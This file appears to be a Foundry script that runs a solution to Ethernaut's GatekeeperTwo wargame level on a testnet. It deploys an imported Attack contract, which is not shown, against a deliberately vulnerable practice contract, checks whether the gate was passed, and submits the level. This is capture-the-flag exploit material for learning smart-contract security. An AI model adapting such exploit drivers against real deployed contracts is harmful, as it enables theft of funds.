// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {GatekeeperTwo} from "../src/Level14.sol";
import {Attack} from "../src/Level14Attack.sol";

contract Level14 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address caller = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        // GatekeeperTwo instance = new GatekeeperTwo();
        GatekeeperTwo instance = GatekeeperTwo(vm.envAddress("LVL14_ADDR"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Attack attack = new Attack(instance);

        if (instance.entrant() != caller) {
            console2.log("call failed");
        } else ethernaut.submitLevelInstance(address(instance));
    }
}

// forge script script/Level14.s.sol --broadcast --rpc-url sepolia
